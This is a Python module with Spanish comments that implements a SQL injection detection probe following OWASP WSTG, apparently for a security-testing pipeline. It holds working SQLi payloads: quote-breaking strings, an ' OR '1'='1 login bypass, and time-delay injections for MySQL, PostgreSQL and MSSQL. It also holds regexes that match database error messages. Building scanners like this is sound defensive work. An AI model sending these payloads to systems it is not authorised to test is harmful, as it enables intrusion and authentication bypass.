"""
Sonda SQL Injection — OWASP WSTG-INPV-05.

Cuarta sonda propia, escrita desde cero a partir de la metodología
pública OWASP WSTG (sin mirar wstg-scan — ver CLAUDE.md, clean-room).
Hueco que llevaba abierto desde el principio: route_patterns.py lleva
sugiriendo "SQLi en el formulario" para rutas de login desde el primer
día, pero hasta ahora el pipeline no tenía forma de confirmarlo nunca.

Dos técnicas, igual de estructura que ssti.py/path_traversal.py:

1. Basada en errores: inyecta comillas sueltas y un payload clásico de
   bypass (' OR '1'='1) y busca mensajes de error de motores de BD
   habituales (MySQL/PostgreSQL/MSSQL/SQLite/Oracle) en la respuesta —
   si el backend concatena el input sin escapar en una consulta SQL,
   una comilla mal cerrada suele hacer que el motor se queje con un
   mensaje reconocible.

2. Ciega por tiempo: inyecta una función de retardo (SLEEP/pg_sleep/
   WAITFOR DELAY, según motor) y compara el tiempo de respuesta contra
   una petición de referencia sin payload — si el backend ejecuta la
   consulta igual (sin reflejar nada ni dar error visible), un retraso
   consistente con el tiempo inyectado es la única señal posible. Esto
   es justo lo que hace sqlmap por dentro, pero aquí se para en
   "parece que hay inyección" — no sigue hasta volcar la base de
   datos, que ya sería la solución, no la pista (ver CLAUDE.md).

No se prueba bypass de autenticación por booleano/diferencial (' OR
'1'='1 vs ' OR '1'='2 comparando longitud de respuesta): más ruido de
falsos positivos en páginas con contenido dinámico, y los dos métodos
de arriba ya cubren los casos más claros. Si hace falta, se añade
después de ver qué tipo de falsos negativos deja en la práctica.
"""

import re
import time

import httpx

from . import concurrency

TIMEOUT = 12
SLEEP_SECONDS = 5
TIME_THRESHOLD = 4  # margen por debajo de SLEEP_SECONDS, para tolerar jitter de red

ERROR_PAYLOADS = ["'", '"', "' OR '1'='1", "1' OR '1'='1' -- -"]

# (motor, patrón de error típico en la respuesta)
ERROR_SIGNATURES = [
    ("MySQL", re.compile(r"you have an error in your sql syntax|warning:\s*mysqli?_|sqlstate\[", re.I)),
    ("PostgreSQL", re.compile(r"pg_query\(\)|postgresql query failed|unterminated quoted string", re.I)),
    ("MSSQL", re.compile(r"unclosed quotation mark|microsoft ole db provider|incorrect syntax near", re.I)),
    ("SQLite", re.compile(r"sqlite3?\.operationalerror|sqlite_error|near \".*\": syntax error", re.I)),
    ("Oracle", re.compile(r"ora-\d{5}", re.I)),
]

# (motor, payload de retardo)
TIME_PAYLOADS = [
    ("MySQL", "' OR SLEEP(5)-- -"),
    ("PostgreSQL", "'; SELECT pg_sleep(5)-- -"),
    ("MSSQL", "'; WAITFOR DELAY '0:0:5'-- -"),
]


def _send(client: httpx.Client, point: dict, value: str) -> tuple[str, float]:
    params = dict(point.get("params", {}))
    params[point["param"]] = value
    t0 = time.monotonic()
    if point["method"] == "GET":
        resp = client.get(point["url"], params=params, timeout=TIMEOUT)
    else:
        resp = client.post(point["url"], data=params, timeout=TIMEOUT)
    return resp.text, time.monotonic() - t0


def _finding(point: dict, evidencia: str) -> dict:
    return {
        "name": "SQLI",
        "detail": (
            f"{point['method']} {point['url']} — el parámetro '{point['param']}' "
            f"huele a SQL Injection: {evidencia}. Por ahí podría colarse acceso "
            f"a datos que no deberían verse, o incluso un bypass de login — "
            f"vale la pena tirar del hilo."
        ),
        "severity": "high",
    }


def _test_point(client: httpx.Client, point: dict) -> dict | None:
    for payload in ERROR_PAYLOADS:
        try:
            body, _ = _send(client, point, payload)
        except httpx.HTTPError:
            continue
        for motor, patron in ERROR_SIGNATURES:
            if patron.search(body):
                return _finding(
                    point,
                    f"al meter {payload!r} apareció en la respuesta un mensaje "
                    f"de error típico de {motor}",
                )

    try:
        _, baseline = _send(client, point, "1")
    except httpx.HTTPError:
        return None

    for motor, payload in TIME_PAYLOADS:
        try:
            _, elapsed = _send(client, point, payload)
        except httpx.HTTPError:
            continue
        if elapsed - baseline >= TIME_THRESHOLD:
            return _finding(
                point,
                f"al meter un retardo de {SLEEP_SECONDS}s con sintaxis de "
                f"{motor} la respuesta tardó {elapsed:.1f}s frente a los "
                f"{baseline:.1f}s de referencia sin payload — huele a "
                f"inyección ciega por tiempo",
            )

    return None


def run(injection_points: list[dict]) -> list[dict]:
    """Devuelve una lista de hallazgos (uno por punto de inyección
    donde se detecta SQLi), con el mismo convenio que el resto de
    módulos: {"name", "detail", "severity"}. El timeout lo controla
    dojohack.timeouts.run_module, no esta función. Los puntos se
    prueban en paralelo con un tope moderado de hilos (ver
    concurrency.py) — suficiente para no comerse el timeout del
    módulo con cientos de puntos, sin tantos a la vez como para meter
    ruido en la detección ciega por tiempo (TIME_PAYLOADS)."""
    with httpx.Client(follow_redirects=True) as client:
        return concurrency.run_points(_test_point, client, injection_points)
